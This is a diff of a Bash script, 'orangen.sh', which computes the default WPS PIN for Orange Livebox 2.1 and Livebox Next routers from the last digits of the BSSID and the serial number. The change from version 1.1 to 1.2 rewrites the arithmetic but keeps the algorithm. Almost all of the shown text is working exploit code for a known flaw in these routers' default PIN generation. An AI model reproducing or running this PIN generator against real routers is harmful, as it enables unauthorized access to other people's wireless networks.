@@ -1,5 +1,5 @@
 #! /bin/bash
-version=1.1
+version=1.2
 # orangen.sh: Default pin generator for livebox 2.1 and livebox next
 # Algorithm and vulnerability by wifi-libre. For more details check https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
@@ -21,26 +21,24 @@ until  [[ "$(echo $bssid | tr A-F a-f | egrep -o '^[0-9a-f]{4}' | wc -c)" == 5 ]
    read -n 4 -ep "    " bssid
    echo -e "$grey"  
 done
-wan=$(printf "%04x" $(( 0x$(echo $bssid) - 2 )))
+wan=$(printf "%04x" $(( 0x$bssid - 2 )))
 until  [[ "$(echo $serial | egrep -o '^[0-9]{4}' | wc -c)" == 5 ]];
   do
    echo -e  "▐█ Entra los$white 4 últimos digítos$grey del$white número de serie$orange"
    read -n 4 -ep "    " serial
    echo -e "$grey"  
 done
-K1=$(printf "%X\n" $(( 0x$(echo $serial | cut -c 2) + 0x$(echo $serial | cut -c 1)  + 0x$(echo $wan | cut -c 4) + 0x$(echo $wan | cut -c 3) )) | rev | cut -c 1)
-K2=$(printf "%X\n" $(( 0x$(echo $serial | cut -c 4) + 0x$(echo $serial | cut -c 3)  + 0x$(echo $wan | cut -c 2) + 0x$(echo $wan | cut -c 1) )) | rev | cut -c 1)
-D1=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 4))) | cut -c 3)
-D2=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 3))) | cut -c 3) 
-D3=$(printf '0x%X\n' $(( 0x$K2 ^ 0x$(echo $wan | cut -c 2))) | cut -c 3)
-D4=$(printf '0x%X\n' $(( 0x$K2 ^ 0x$(echo $wan | cut -c 3))) | cut -c 3) 
-D5=$(printf '0x%X\n' $(( 0x$(echo $serial | cut -c 4) ^ 0x$(echo $wan | cut -c 3))) | cut -c 3)
-D6=$(printf '0x%X\n' $(( 0x$(echo $serial | cut -c 3) ^ 0x$(echo $wan | cut -c 4))) | cut -c 3)
-D7=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 2))) | cut -c 3)
-conversion=$(printf '%d\n' 0x$D1$D2$D3$D4$D5$D6$D7)
-string=$(printf '%07d\n' $((conversion%10000000)))
-accum=$(($(echo "$string" | cut -c 1) * 3 + $(echo "$string" | cut -c 2) + $(echo "$string" | cut -c 3) * 3 + $(echo "$string" | cut -c 4) + $(echo "$string" | cut -c 5) * 3 + $(echo "$string" | cut -c 6) + $(echo "$string" | cut -c 7) * 3))
-checksum=$((((10 - $((accum%10))))%10))
-echo -e " $white     PIN por defecto: $orange $string$checksum"
+K1=$(printf "%X\n" $(($(( 0x${serial:0:1} + 0x${serial:1:1} + 0x${wan:2:1} + 0x${wan:3:1}))%16)))
+K2=$(printf "%X\n" $(($(( 0x${serial:2:1} + 0x${serial:3:1} + 0x${wan:0:1} + 0x${wan:1:1}))%16)))
+D1=$(printf "%X\n" $(($(( 0x$K1 ^ 0x${serial:3:1}))%16)))
+D2=$(printf "%X\n" $(($(( 0x$K1 ^ 0x${serial:2:1}))%16))) 
+D3=$(printf "%X\n" $(($(( 0x$K2 ^ 0x${wan:1:1}))%16)))
+D4=$(printf "%X\n" $(($(( 0x$K2 ^ 0x${wan:2:1}))%16)))
+D5=$(printf "%X\n" $(($(( 0x${serial:3:1} ^ 0x${wan:2:1}))%16)))
+D6=$(printf "%X\n" $(($(( 0x${serial:2:1} ^ 0x${wan:3:1}))%16)))
+D7=$(printf "%X\n" $(($(( 0x$K1 ^ 0x${serial:1:1}))%16)))
+pin=$(printf '%07d\n' $(($(printf '%d\n' 0x$D1$D2$D3$D4$D5$D6$D7)%10000000)))
+checksum=$((10 - $(($((${pin:0:1} * 3 + ${pin:1:1} + ${pin:2:1} * 3 + ${pin:3:1} + ${pin:4:1} * 3 + ${pin:5:1} + ${pin:6:1} * 3))%10))%10))
+echo -e " $white     PIN por defecto: $orange $pin$checksum"
 echo -e "$grey
 Copyleft (C) 2017 kcdtv @ www.wifi-libre.com"
